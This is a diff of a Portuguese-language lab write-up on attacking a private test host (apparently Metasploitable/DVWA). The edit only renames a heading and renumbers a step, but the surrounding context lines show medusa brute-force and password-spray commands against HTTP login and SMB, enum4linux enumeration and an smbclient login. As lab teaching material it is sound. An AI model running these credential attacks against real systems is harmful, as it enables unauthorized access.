@@ -72,7 +72,7 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 
 - **Resumo:** O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.
 
-## 5 - 💻 Cenários de Ataques SMB:
+## 5 - 💻 Cenário de Ataque SMB:
 * **Etapa 4:** Enumerar informações de sistemas Windows ou serviços SMB/Samba.
 ```bash
 enum4linux -a 192.168.56.102 | tee enum4_output.txt
@@ -83,7 +83,7 @@ enum4linux -a 192.168.56.102 | tee enum4_output.txt
 ```bash
 medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
 ```
-* **Etapa 4.1:** Acesso ao servidor SMB:
+* **Etapa 4.2:** Acesso ao servidor SMB:
 ```bash
 smbclient -L //192.168.56.102 -U msfadmin
 ```
